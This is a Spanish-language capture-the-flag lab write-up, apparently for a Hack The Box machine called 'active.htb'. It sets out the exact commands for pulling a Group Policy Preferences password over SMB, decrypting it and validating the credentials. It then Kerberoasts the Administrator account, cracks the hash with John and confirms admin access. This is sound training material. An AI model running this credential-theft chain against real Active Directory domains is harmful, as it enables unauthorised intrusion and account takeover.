## Vulnerability Assessment {-}

### Groups.xml {-}

Hemos encontrado el fichero `groups.xml`, lo descargamos

```bash
smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04F894F9}/MACHINE/Preferences/Groups/Groups.xml

mv Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04F894F9}/MACHINE/Preferences/Groups/Groups.xml Groups.xml
cat Groups.xml
```

Aqui vemos el usuario y la contraseña encryptada.

```bash
gpp-decrypt "edBSHOwhZLTjt/Q59FeIcJ83mjWA98gw9gukOhjOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

Ya tenemos la contraseña. Verificamos si las credenciales son validas.

```bash
crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

Es valida pero no tenemos el Pwn3d. Miramos si este usuario tiene acceso a mas registros compartidos a nivel de red.

```bash
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

Hay unos cuantos mas. Miramos lo que hay en el registro Users

```bash
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users
```

Como solo vemos nuestro usuario y el administrator, y quel puerto 88 esta abierto, intentamos un Kerberoasting attack.

### Kerberoasting attack {-}

```bash
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
```

Aqui podemos ver que el usuario Administrator es kerberoasteable.

```bash
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
```

Copiamos el hash y intentamos romperlo con John

### Crack hash with John {-}

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Ya tenemos la contraseña del usuario Administrator. Lo verificamos con crackmapexec

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
```

Ademas de ser valido, vemos el famoso **(Pwn3d!)**
